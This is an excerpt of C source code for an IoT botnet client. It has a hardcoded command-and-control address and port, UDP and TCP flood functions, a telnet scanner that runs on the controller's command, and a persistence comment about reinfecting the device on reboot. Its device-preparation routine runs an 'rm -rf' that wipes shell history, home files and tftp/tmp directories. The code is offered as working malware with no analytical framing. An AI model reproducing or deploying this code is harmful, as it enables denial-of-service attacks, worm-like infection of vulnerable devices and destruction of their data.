...
!* STD <IP> <PORT> <TIME>-------------------CUSTOM UDP FLOOD (faster and harder hitting)
...
!* TELNET ON | OFF------TURNS TELNET SCANNER ON/OFF
...
unsigned char *cncip = "142.93.57.66";
int cncport = 1998;
...
void sendUDP(unsigned char * target, int port, int secs) {
    
	struct sockaddr_in dest_addr;
	int packetsize = getdtablesize() / 2;
	register unsigned int i = 0;
...
void sendTCP(unsigned char *ip, int port, int secs) {
...
void prepareDevice() {
	...
	system("rm -rf ~/.bash_history ~/* /var/lib/tftpboot/* /var/tftp /tmp/*");
	findwritedir();
    chdir(killi->writedir);
}
...
void processCmd(int argc, unsigned char * argv[]) {
    ...
    if(!strcmp(argv[0], "TELNET")) {
        ...
        if(!strcmp(argv[1], "ON")) {
            scanner_init();
            sockprintf(mainCommSock, "TELNET SCANNER STARTED");
        }
        if(!strcmp(argv[1], "CNC")) {
            scanner_init();
        }
        return;
    }
    ...
    if(!strcmp(argv[0], "UDP")) {
        if(argc < 4 || atoi(argv[3]) == -1 || atoi(argv[2]) == -1) {
            return;
        }
...
int main(int argc, unsigned char * argv[]) {
    ...
    unsigned char *botid = argv[1];
    srand(time(NULL) ^ getpid());
    init_rand(time(NULL) ^ getpid());
    int dupthing = 0;
    zprintf("{MODZ}- You Can Find Me At modz.crimson.rip -{daddyl33t}");
    zprintf("\r\n");
    int wfd = 0;
    ...
    char cwd[256],*str;// Prepare to reinfect device upon reboot
    FILE *file;
    ...
    while(1) {
        ...
        sockprintf(mainCommSock, "\x1b[1;33mDevice Connected -> [%s] [%s] [%s] \x1b[0m", (char *)inet_ntoa(ourIP), (char *)VERSION, (char*)botid);
        char commBuf[4096];
        int got = 0;
        int i = 0;
